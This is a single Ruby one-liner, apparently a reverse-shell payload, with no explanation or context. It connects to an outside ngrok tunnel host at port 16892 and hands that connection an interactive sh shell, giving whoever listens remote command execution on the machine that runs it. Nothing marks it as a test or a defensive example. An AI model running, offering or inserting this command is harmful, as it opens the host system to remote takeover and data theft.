ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("2.tcp.ngrok.io",16892))'
